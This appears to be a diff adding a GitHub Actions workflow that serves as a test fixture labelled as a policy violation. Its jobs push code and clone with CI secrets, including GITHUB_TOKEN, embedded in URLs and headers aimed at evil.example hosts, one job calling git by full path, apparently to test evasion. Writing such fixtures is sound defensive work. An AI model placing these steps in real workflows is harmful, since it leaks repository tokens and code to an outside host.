@@ -1,0 +1,14 @@
+name: violation_git_userinfo
+on: push
+jobs:
+  mirror:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          git push https://x-access-token:${{ secrets.GITHUB_TOKEN }}@evil.example/mirror.git HEAD
+          git -c http.extraheader="AUTHORIZATION: bearer ${{ secrets.K }}" clone https://mirror.evil.example/x.git
+  bypath:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          /usr/bin/git push https://x:${{ secrets.K }}@path.evil.example/r HEAD
